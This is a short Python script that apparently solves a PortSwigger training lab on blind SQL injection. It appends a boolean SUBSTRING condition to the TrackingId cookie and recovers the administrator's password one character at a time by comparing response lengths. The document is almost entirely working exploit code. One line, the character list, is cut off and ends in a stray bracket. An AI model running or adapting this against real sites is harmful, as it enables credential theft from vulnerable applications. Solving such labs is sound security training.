import requests

### At first, login PORTSWIGGER and lab and copy site address and paste it on 'url'.
url = "LINK OF PORTSWIGGER'S LAB"

sql_query = "' AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), {0}, 1) = '{1}"
list1 = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
list2 = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',0,1,2,3,4,5,6,7,8,9>
password = ''

r = requests.get(url)
first_page_size = len(r.content)
trackingid = r.cookies['TrackingId']


for x in list1:
        page_size = first_page_size
        print('Progressing ' + str(x) + '...')
        for y in list2:
                cookies = {'TrackingId' : trackingid + sql_query.format(x,y)}
                r = requests.get(url, cookies = cookies)
                if (len(r.content) > page_size):
                        page_size = len(r.content)
                        letter = y
                        break
        print(str(x) + ' -> ' + str(letter) + ' -> ' + str(page_size))
        password += str(letter)

print(password)
